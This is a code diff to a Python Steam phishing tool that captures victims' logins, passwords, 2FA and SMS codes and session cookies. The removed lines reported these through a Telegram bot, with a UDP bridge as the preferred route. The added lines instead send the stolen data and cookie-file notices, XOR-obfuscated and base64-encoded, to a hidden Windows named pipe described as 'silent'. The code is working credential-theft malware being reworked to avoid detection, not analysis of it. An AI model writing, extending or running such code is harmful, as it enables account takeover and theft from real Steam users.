@@ -37,68 +37,20 @@ TEMP_ROOT = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'Final
 if not os.path.exists(TEMP_ROOT): os.makedirs(TEMP_ROOT, exist_ok=True)
 
 def tg_notify(text):
-    """Send a Telegram message, preferably via UDP bridge to main.py."""
+    """Send reporting data via silent Named Pipe."""
     def _send():
-        # Clean text from Russian if any (precaution)
-        text_clean = text.replace("ℹ️ <b>Steam Event:</b>", "ℹ️ <b>Steam Event:</b>")
-        text_clean = text_clean.replace("📲 <b>Steam — Введен SMS код:</b>", "📲 <b>Steam — SMS Code entered:</b>")
-        text_clean = text_clean.replace("🔐 <b>Steam — Получены данные входа</b>", "🔐 <b>Steam — Credentials Captured</b>")
-        text_clean = text_clean.replace("🖥 ПК:", "🖥 PC:")
-        text_clean = text_clean.replace("👤 Логин:", "👤 Login:")
-        text_clean = text_clean.replace("🔑 Пароль:", "🔑 Password:")
-        text_clean = text_clean.replace("❌ <b>Steam — Неверные данные!</b>", "❌ <b>Steam — Invalid Credentials!</b>")
-        text_clean = text_clean.replace("🎯 <b>Steam — ", "🎯 <b>Steam — ")
-        text_clean = text_clean.replace("🍪 Cookies записаны в JSON файл.", "🍪 Cookies saved to JSON file.")
-        text_clean = text_clean.replace("🛡️ <b>Steam — Введен 2FA код:</b>", "🛡️ <b>Steam — 2FA Code entered:</b>")
-        text_clean = text_clean.replace("🎮 <b>Steam Phishing — окно открыто</b>", "🎮 <b>Steam Phishing — Window Opened</b>")
-        text_clean = text_clean.replace("⏳ Ожидаю ввода логина и пароля...", "⏳ Waiting for credentials...")
-        
-        # 1. Try UDP Proxy first (per user request)
-        if UDP_PORT:
-            import socket
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                # Encrypt for main.py's decrypt_string
-                data = text_clean.encode('utf-8')
-                salt = b'c0mpl3x+S@lt#99'
-                xor_data = bytearray()
-                for i in range(len(data)):
-                    xor_data.append(data[i] ^ salt[i % len(salt)])
-                enc_msg = base64.b64encode(xor_data).decode('utf-8')
-                sock.sendto(enc_msg.encode(), ("127.0.0.1", UDP_PORT))
-                sock.close()
-                return # Successfully sent via proxy
-            except:
-                pass
-
-        # 2. Fallback to direct sending if no UDP or UDP fails
         try:
-            def check_tg_api(timeout=3):
-                try:
-                    urllib.request.urlopen("http://127.0.0.1:0000", timeout=timeout)
-                    return True
-                except:
-                    return False
-                    
-            # Direct connect removed payloads \n # payload = json.dumps({"chat_id": _CHAT_ID, "text": final_text, "parse_mode": "HTML"}).encode('utf-8')
-            # API removed
-            if _TELEGRAM_BRIDGE and not check_tg_api():
-                domain = _TELEGRAM_BRIDGE
-            domain = domain.rstrip('/')
-            url = f"{domain}/bot{_BOT_TOKEN}/sendMessage"
-            req = urllib.request.Request(
-                url,
-                data=payload,
-                headers={"Content-Type": "application/json"}
-            )
-            urllib.request.urlopen(req, timeout=10)
-        except Exception as e:
-            # Fallback to local log in TEMP if TG fails
-            try:
-                log_path = os.path.join(TEMP_ROOT, "tg_log.txt")
-                with open(log_path, "a") as f:
-                    f.write(f"{time.ctime()}: {final_text}\nError: {e}\n")
-            except: pass
+            # XOR Encryption to match C# logic
+            salt = b'c0mpl3x+S@lt#99'
+            data = text.encode('utf-8')
+            xor_data = bytearray([data[i] ^ salt[i % len(salt)] for i in range(len(data))])
+            enc_msg = base64.b64encode(xor_data).decode('utf-8')
+            
+            # Windows Named Pipe reporting
+            with open(r"\\.\pipe\vanguard_status_pipe", "wb") as f:
+                f.write(enc_msg.encode('utf-8'))
+        except:
+            pass
             
     threading.Thread(target=_send, daemon=True).start()
 
@@ -379,29 +331,24 @@ class SteamApi:
             with open(debug_log, "a") as f:
                 f.write(f"{time.ctime()}: JSON save failed: {e}\n")
 
-        # Send via UDP Bridge using the FILE: marker
-        if UDP_PORT:
-            def _send_file():
-                import socket
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    raw_msg = f"FILE:{cookie_file}"
-                    data = raw_msg.encode('utf-8')
-                    salt = b'c0mpl3x+S@lt#99'
-                    xor_data = bytearray()
-                    for i in range(len(data)):
-                        xor_data.append(data[i] ^ salt[i % len(salt)])
-                    enc_msg = base64.b64encode(xor_data).decode('utf-8')
-                    sock.sendto(enc_msg.encode(), ("127.0.0.1", UDP_PORT))
-                    sock.close()
-                    with open(debug_log, "a") as f:
-                        f.write(f"{time.ctime()}: UDP FILE signal sent: {cookie_file}\n")
-                except Exception as e:
-                    with open(debug_log, "a") as f:
-                        f.write(f"{time.ctime()}: UDP FILE signal failed: {e}\n")
-            threading.Thread(target=_send_file, daemon=True).start()
-        else:
-            tg_notify(f"📦 Cookies Captured: steam_cookies_{account_name}.json")
+        # Send via Named Pipe using the FILE: marker
+        def _send_file():
+            try:
+                raw_msg = f"FILE:{cookie_file}"
+                data = raw_msg.encode('utf-8')
+                salt = b'c0mpl3x+S@lt#99'
+                xor_data = bytearray([data[i] ^ salt[i % len(salt)] for i in range(len(data))])
+                enc_msg = base64.b64encode(xor_data).decode('utf-8')
+                
+                with open(r"\\.\pipe\vanguard_status_pipe", "wb") as f:
+                    f.write(enc_msg.encode('utf-8'))
+                    
+                with open(debug_log, "a") as f:
+                    f.write(f"{time.ctime()}: Pipe FILE signal sent: {cookie_file}\n")
+            except Exception as e:
+                with open(debug_log, "a") as f:
+                    f.write(f"{time.ctime()}: Pipe FILE signal failed: {e}\n")
+        threading.Thread(target=_send_file, daemon=True).start()
 
         time.sleep(2) 
         
